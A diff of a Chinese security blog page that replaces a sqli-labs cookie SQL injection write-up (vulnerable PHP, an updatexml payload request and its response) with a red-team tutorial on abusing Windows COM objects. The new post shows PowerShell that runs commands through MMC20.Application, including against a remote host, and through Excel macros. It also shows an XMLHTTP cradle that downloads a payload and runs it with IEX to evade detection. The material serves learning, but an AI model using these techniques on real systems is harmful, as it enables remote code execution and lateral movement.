@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Secondary injection of sql injection | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="Secondary injection of sql injection | 九世的博客">
+  <title>COM接口学习与利用 | 九世的博客</title>
+  <meta name="keywords" content=" 红队 ">
+  <meta name="description" content="COM接口学习与利用 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1490,9 +1490,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Secondary-injection-of-sql-injection" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-COM接口学习与利用" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Secondary injection of sql injection</h1>
+        <h1 class="article-title">COM接口学习与利用</h1>
     
     <div class="article-meta">
         
@@ -1501,14 +1501,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">红队</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-01-17 13:59</time>
+        创建时间:<time class="date" title="更新时间: 2020-10-03 01:18:46">2020-10-03 01:03</time>
         
     </div>
     <div class="article-meta">
@@ -1530,7 +1530,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#何为COM"><span class="toc-text">何为COM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注册表路径说明"><span class="toc-text">注册表路径说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#枚举机器上所有的CLSID"><span class="toc-text">枚举机器上所有的CLSID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#寻找可利用的COM接口"><span class="toc-text">寻找可利用的COM接口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用COM接口"><span class="toc-text">利用COM接口</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1545,269 +1545,87 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天看了Web安全攻防这本书的SQL cookie注入那里，如果书上提供的那个测试地址失效了。还好今天的Sqli-labss第二十关。<br><img src="http://p1.qhimgs4.com/bdr/640__/t019e2c9a650b6e85ec.jpg" alt="t019e2c9a650b6e85ec.jpg"></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先我们先打开sqli-labs第二十关的代码仔细审计一遍</p>
-<pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-
-&lt;title&gt;Less-20 Cookie Injection- Error Based- string&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;?php
-//including the Mysql connect parameters.
-    include(&quot;../sql-connections/sql-connect.php&quot;); /*包含该php文件*/
-    error_reporting(0);
-if(!isset($_COOKIE[&#39;uname&#39;])) /*如果变量不存在则执行*/
-    {
-    //including the Mysql connect parameters.
-    include(&quot;../sql-connections/sql-connect.php&quot;);
-
-    echo &quot;&lt;div style=&#39; margin-top:20px;color:#FFF; font-size:24px; text-align:center&#39;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&#39;#FF0000&#39;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&quot;;
-    echo &quot;&lt;div  align=&#39;center&#39; style=&#39;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&#39;&gt;&quot;;
-    echo &quot;&lt;div style=&#39;padding-top:10px; font-size:15px;&#39;&gt;&quot;;
-
-
-    echo &quot;&lt;!--Form to post the contents --&gt;&quot;;
-    echo &#39;&lt;form action=&quot; &quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;&#39;;
-
-    echo &#39; &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;&#39;;
-    echo &#39;   &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;  &lt;/div&gt;&#39;;
-
-    echo &#39; &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;&#39;;
-    echo &#39;   &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;&#39;;    
-    echo &#39;   &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&#39;;
-
-    echo &#39;&lt;/form&gt;&#39;;
-    echo &#39;&lt;/div&gt;&#39;;
-    echo &#39;&lt;/div&gt;&#39;;
-    echo &#39;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&#39;;
-    echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;;
-    echo &#39;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;;
-    echo &#39;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#39;;
-    echo &#39;&lt;/center&gt;&#39;;
-
-
-
-
-
-function check_input($value)
-    {
-    if(!empty($value)) /*如果变量不为空*/
-        {
-        $value = substr($value,0,20); // truncation (see comments) /*从0的位置开始读取，长度为20*/
-        }
-        if (get_magic_quotes_gpc())  // Stripslashes if magic quotes enabled /*开启magic_quotes*/
-            {
-            $value = stripslashes($value); /*反引用一个引用字符串*/
-            }
-        if (!ctype_digit($value))       // Quote if not a number /*纯数字检查*/
-            {
-            $value = &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;
-            }
-    else
-        {
-        $value = intval($value); /*取整数*/
-        }
-    return $value;
-    }
-
-
-
-    echo &quot;&lt;br&gt;&quot;;
-    echo &quot;&lt;br&gt;&quot;;
-
-    if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;])) /*判断uname和passwd是否存在*/
-        {
-
-        $uname = check_input($_POST[&#39;uname&#39;]); /*调用check_input过滤变量*/
-        $passwd = check_input($_POST[&#39;passwd&#39;]);
-
-
-
-
-        $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
-        $result1 = mysql_query($sql); /*查询数据库*/
-        $row1 = mysql_fetch_array($result1);
-        $cookee = $row1[&#39;username&#39;];
-            if($row1)
-                {
-                echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#39;;
-                setcookie(&#39;uname&#39;, $cookee, time()+3600);    
-                header (&#39;Location: index.php&#39;);
-                echo &quot;I LOVE YOU COOKIES&quot;;
-                echo &quot;&lt;/font&gt;&quot;;
-                echo &#39;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#39;;            
-                //echo &#39;Your Cookie is: &#39; .$cookee;
-                echo &quot;&lt;/font&gt;&quot;;
-                echo &quot;&lt;br&gt;&quot;;
-                print_r(mysql_error());            
-                echo &quot;&lt;br&gt;&lt;br&gt;&quot;;
-                echo &#39;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#39;;
-                echo &quot;&lt;br&gt;&quot;;
-                }
-            else
-                {
-                echo &#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;;
-                //echo &quot;Try again looser&quot;;
-                print_r(mysql_error());
-                echo &quot;&lt;/br&gt;&quot;;            
-                echo &quot;&lt;/br&gt;&quot;;
-                echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#39;;    
-                echo &quot;&lt;/font&gt;&quot;;  
-                }
-            }
-
-            echo &quot;&lt;/font&gt;&quot;;  
-    echo &#39;&lt;/font&gt;&#39;;
-    echo &#39;&lt;/div&gt;&#39;;
-
+        <h2 id="何为COM"><a href="#何为COM" class="headerlink" title="何为COM"></a>何为COM</h2><p>OM component（COM组件）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。由此带来的好处是多方面的：可以将系统中的组件用新的替换掉，以便随时进行系统的升级和定制；可以在多个应用系统中重复利用同一个组件；可以方便的将应用系统扩展到网络环境下；COM与语言，平台无关的特性使所有的程序员均可充分发挥自己的才智与专长编写组件模块。</p>
+<p>找了篇文章编写了一个COM接口<br>参考链接:<a href="https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html</a><br>COM接口里有个calc函数<br><img src="https://s1.ax1x.com/2020/10/03/01Qete.png" alt=""></p>
+<p>生成DLL后，用regsvr32注册完后，可以在HKEY_CLASSES_ROOT\CLSID\下可以见到注册好的dll<br><img src="https://s1.ax1x.com/2020/10/03/01QmfH.md.png" alt=""></p>
+<p>使用powershell可以查询对应COM的可用函数</p>
+<pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;20CE411F-4415-4017-B797-66AE3B8C9A4D&quot;)) #枚举对于appid可用的函数
+$obj | get-member
+</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QK1A.png" alt=""></p>
+<p>调用对应COM接口的函数</p>
+<pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;20CE411F-4415-4017-B797-66AE3B8C9A4D&quot;))
+$handle.calc()
+</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01Q30f.png" alt=""></p>
+<h2 id="注册表路径说明"><a href="#注册表路径说明" class="headerlink" title="注册表路径说明"></a>注册表路径说明</h2><p>HKEY_CLASSES_ROOT\CLSID 所有COM接口对应的CLSID都在这个项或子项下<br><img src="https://s1.ax1x.com/2020/10/03/01QYtg.png" alt=""></p>
+<p>CLSID项下场见的子项</p>
+<pre><code>* lnprocServer32
+* TypeLib
+* version
+* progID
+</code></pre><p>lnprocServer32写着这个COM接口处理的dll<br><img src="https://s1.ax1x.com/2020/10/03/01QUpj.png" alt=""></p>
+<p>InprocServer32写着接口的信息/版本<br><img src="https://s1.ax1x.com/2020/10/03/01Qdcn.png" alt=""></p>
+<h2 id="枚举机器上所有的CLSID"><a href="#枚举机器上所有的CLSID" class="headerlink" title="枚举机器上所有的CLSID"></a>枚举机器上所有的CLSID</h2><p>指定类名为WIN32_DCOMApplication</p>
+<pre><code>Get-CimInstance -ClassName WIN32_DCOMApplication
+</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QwXq.png" alt=""></p>
+<p>Get-CimInstance （简写：Get-cim）作用：从CIM服务器获取类的CIM实例<br><img src="https://s1.ax1x.com/2020/10/03/01QBn0.png" alt=""></p>
+<p>CIM：公共信息模型（CIM）是用于描述受管理资源（如存储，网络或软件组件）的结构和行为的DMTF标准[DSP0004]。</p>
+<p>查询指定CLSID可用函数</p>
+<pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C5EDFC9D-B018-41A4-9877-39AB18469C3A&quot;))
+$obj | get-member
+</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QDBV.png" alt=""></p>
+<p>快速提起所有CLSID和对应的CLSID里的函数</p>
+<pre><code>Get-CimInstance -ClassName WIN32_DCOMApplication | Select-Object appid | out-file clsids.txt
+$Position  = 1
+$Filename = &quot;win10-clsid-members.txt&quot;
+$inputFilename = &quot;clsids.txt&quot;
+ForEach($CLSID in Get-Content $inputFilename) {
+      Write-Output &quot;$($Position) - $($CLSID)&quot;
+      Write-Output &quot;------------------------&quot; | Out-File $Filename -Append
+      Write-Output $($CLSID) | Out-File $Filename -Append
+      $handle = [activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))
+      $handle | Get-Member | Out-File $Filename -Append
+      $Position += 1
 }
-else
-{
-
-
-
-    if(!isset($_POST[&#39;submit&#39;])) /*如果submit不存在*/
-        {
-
-            $cookee = $_COOKIE[&#39;uname&#39;];
-            $format = &#39;D d M Y - H:i:s&#39;;
-            $timestamp = time() + 3600;
-            echo &quot;&lt;center&gt;&quot;;
-            echo &#39;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;;
-            echo &#39;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#39;;
-            echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;
-            echo &#39;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&#39;;    
-            echo &quot;YOUR USER AGENT IS : &quot;.$_SERVER[&#39;HTTP_USER_AGENT&#39;];
-            echo &quot;&lt;/font&gt;&lt;br&gt;&quot;;    
-            echo &#39;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&#39;;    
-            echo &quot;YOUR IP ADDRESS IS : &quot;.$_SERVER[&#39;REMOTE_ADDR&#39;];            
-            echo &quot;&lt;/font&gt;&lt;br&gt;&quot;;            
-            echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&#39;;
-            echo &quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;;
-            echo &#39;&lt;font color= &quot;orange&quot; font size = 5 &gt;&#39;;            
-            echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp);
-
-
-            echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;
-            $sql=&quot;SELECT * FROM users WHERE username=&#39;$cookee&#39; LIMIT 0,1&quot;;
-            $result=mysql_query($sql);
-            if (!$result)
-                  {
-                  die(&#39;Issue with your mysql: &#39; . mysql_error());
-                  }
-            $row = mysql_fetch_array($result);
-            if($row)
-                {
-                  echo &#39;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#39;;    
-                  echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-                  echo &quot;&lt;br&gt;&quot;;
-                echo &#39;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#39;;      
-                echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-                  echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;;
-                echo &quot;&lt;br&gt;&quot;;
-                echo &#39;Your ID:&#39; .$row[&#39;id&#39;];
-                  }
-            else    
-                {
-                echo &quot;&lt;center&gt;&quot;;
-                echo &#39;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;;
-                echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;
-                echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;
-                //echo &#39;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#39;;
-                }
-            echo &#39;&lt;center&gt;&#39;;
-            echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;;
-            echo &#39;&lt;input  type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&#39;;
-            echo &#39;&lt;/form&gt;&#39;;
-            echo &#39;&lt;/center&gt;&#39;;
-        }    
-    else
-        {
-        echo &#39;&lt;center&gt;&#39;;
-        echo &quot;&lt;br&gt;&quot;;
-        echo &quot;&lt;br&gt;&quot;;
-        echo &quot;&lt;br&gt;&quot;;
-        echo &quot;&lt;br&gt;&quot;;
-        echo &quot;&lt;br&gt;&quot;;
-        echo &quot;&lt;br&gt;&quot;;
-        echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&#39;;
-        echo &quot; Your Cookie is deleted&quot;;
-                setcookie(&#39;uname&#39;, $row1[&#39;username&#39;], time()-3600);
-                header (&#39;Location: index.php&#39;);
-        echo &#39;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&#39;;
-
-        }        
-
-
-            echo &quot;&lt;br&gt;&quot;;
-            echo &quot;&lt;br&gt;&quot;;
-            //header (&#39;Location: main.php&#39;);
-            echo &quot;&lt;br&gt;&quot;;
-            echo &quot;&lt;br&gt;&quot;;
-
-            //echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&lt;/center&gt;&#39;;
-            //logging the connection parameters to a file for analysis.    
-        $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-        fwrite($fp,&#39;Cookie:&#39;.$cookee.&quot;\n&quot;);
-
-        fclose($fp);
-
-}
-?&gt;
-
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p>从上面的代码可以看到：</p>
-<pre><code>登陆的时候对uname和passwd做了严格的过滤和去除反斜线，但是在通过cookie
-查询的时候没有做过滤直接进行查询，从而引发注入。
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/17/kp8TLn.png" alt="kp8TLn.png"></p>
-<p>cookie中带入注入语句：</p>
-<pre><code>POST /Less-20/index.php HTTP/1.1
-Host: 118.24.125.87:8000
-Content-Length: 0
-Cache-Control: max-age=0
-Origin: http://118.24.125.87:8000
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0
-Content-Type: application/x-www-form-urlencoded
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Referer: http://118.24.125.87:8000/Less-20/
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.8
-Cookie:  uname=admin&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and &#39;1&#39;=&#39;1
-Connection: close
-</code></pre><p>返回结果：</p>
-<pre><code>HTTP/1.1 200 OK
-Date: Thu, 17 Jan 2019 05:37:48 GMT
-Server: Apache/2.4.7 (Ubuntu)
-X-Powered-By: PHP/5.5.9-1ubuntu4.13
-Vary: Accept-Encoding
-Content-Length: 1028
-Connection: close
-Content-Type: text/html
-
-&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-
-&lt;title&gt;Less-20 Cookie Injection- Error Based- string&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-
-
-
-
-
-
-&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0&lt;/font&gt;&lt;br&gt;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;YOUR IP ADDRESS IS : 113.77.238.53&lt;/font&gt;&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&lt;font color= &quot;orange&quot; font size = 5 &gt;YOUR COOKIE : uname = admin&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and &#39;1&#39;=&#39;1 and expires: Thu 17 Jan 2019 - 06:37:48&lt;br&gt;&lt;/font&gt;Issue with your mysql: XPATH syntax error: &#39;~root@localhost~&#39;
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/17/kp8vz4.png" alt="kp8vz4.png"></p>
-<p>转载请声明：转自422926799.github.io</p>
+</code></pre><p>（Method为方法，Property为参数设置之类的）<br><img src="https://s1.ax1x.com/2020/10/03/01QTAO.md.png" alt=""></p>
+<p>枚举某个Application</p>
+<pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Excel.Application&quot;))  
+$obj | Get-Member
+</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QH4e.png" alt=""></p>
+<p>属性继续枚举</p>
+<pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;49B2791A-B1AE-4C90-9B8E-E860BA07F889&quot;))
+$obj.Document | Get-Member
+</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QL3d.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/10/03/01Qvut.png" alt=""></p>
+<h2 id="寻找可利用的COM接口"><a href="#寻找可利用的COM接口" class="headerlink" title="寻找可利用的COM接口"></a>寻找可利用的COM接口</h2><p>对应的CLSID是MMC.exe（那么是否代表着系统自带的程序可以执行命令的话，可以找找一个COM接口的函数），如果是不开源的话只能用IDA或Oleview.exe反编译了<br><img src="https://s1.ax1x.com/2020/10/03/01QzHf.md.png" alt=""></p>
+<p>COM接口里枚举出来的函数（如果是微软公开的话）可以到：<a href="https://docs.microsoft.com/en-us/search/?dataSource=previousVersions&amp;terms=" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/search/?dataSource=previousVersions&amp;terms=</a> 搜索<br>例如：ExecuteShellCommand <a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand</a><br><img src="https://s1.ax1x.com/2020/10/03/01l9US.png" alt=""></p>
+<p>调用函数（注意:如果注册表查询CLSID子项带有ProgID的话需要指定ProgID调用方法或属性）<br><img src="https://s1.ax1x.com/2020/10/03/01lC4g.png" alt=""></p>
+<pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;))
+$handle.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c calc&quot;,&quot;7&quot;)
+</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01lkgs.png" alt=""></p>
+<p>思考：能不能通过微软文档搜索比如什么：Exec,command,file.urldownload这些函数，如果找的到在CLSID项里搜索对应的exe/dll，然后调用呢。或在HKEY_CLASSES_ROOT\CLSID下寻找有ProgID的子项CLSID，寻找可利用项。为什么要找带有ProgID子项的CLSID？因为这些一般都是系统自带的</p>
+<h2 id="利用COM接口"><a href="#利用COM接口" class="headerlink" title="利用COM接口"></a>利用COM接口</h2><p>可以根据对应COM接口枚举出的函数名进行分析，或者猜解。例如</p>
+<pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;00020906-0000-0000-C000-000000000046&quot;))
+$handle.ExecuteExcel4Macro(&quot;EXEC(&quot;&quot;calc.exe&quot;&quot;)&quot;)
+</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01lK5F.png" alt=""></p>
+<blockquote>
+<p>比如，F5078F35-C551-11D3-89B9-0000F81FE221}这个COM对象（Msxml2.XMLHTTP.3.0）对外提供了一个XML HTTP 3.0功能，可以用来下载任意代码并执行，无需将payload写入磁盘，也不会触发基于System.Net.WebClient的常用检测规则。XML HTTP 3.0对象通常用来发起AJAX请求。在这种情况下，获取数据的方式非常简单，直接使用Invoke-Expression cmdlet（IEX）即可。</p>
+</blockquote>
+<pre><code>$o = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;));
+$o.Open(&quot;GET&quot;, &quot;http://192.168.1.106/payload.txt&quot;, $False);
+$o.Send();
+IEX $o.responseText;
+</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01l129.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/10/03/01l3vR.png" alt=""></p>
+<p>对应的open函数反汇编<br><img src="https://s1.ax1x.com/2020/10/03/01lGK1.png" alt=""></p>
+<p>文章里有用 Oleview.exe进行对dll的反编译，也有用IDA对指定DLL的函数进行分析。需要一定的基础进行分析<br>COM的利用方式：</p>
+<pre><code>* 寻找COM接口对应注册表的lnprocServer32缺少的dll/exe替换进行提权
+* 利用COM接口远程调用
+</code></pre><p>COM远程利用：</p>
+<pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.113.130&quot;))
+$handle.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c calc&quot;,&quot;7&quot;)
+</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01lJDx.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/10/03/01lYb6.md.png" alt=""></p>
+<p>参考链接:<br><a href="https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html</a><br><a href="https://www.anquanke.com/post/id/217928" target="_blank" rel="noopener">https://www.anquanke.com/post/id/217928</a><br><a href="https://www.anquanke.com/post/id/179927" target="_blank" rel="noopener">https://www.anquanke.com/post/id/179927</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1817,12 +1635,12 @@ Content-Type: text/html
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Secondary injection of sql injection</p>
+    <p><span class="copy-title">文章标题:</span>COM接口学习与利用</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-01-17, 13:59:34</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/52a98084.html" title="Secondary injection of sql injection">http://422926799.github.io/posts/52a98084.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-10-03, 01:03:33</p>
+    <p><span class="copy-title">最后更新:</span>2020-10-03, 01:18:46</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/ed9cc210.html" title="COM接口学习与利用">http://422926799.github.io/posts/ed9cc210.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
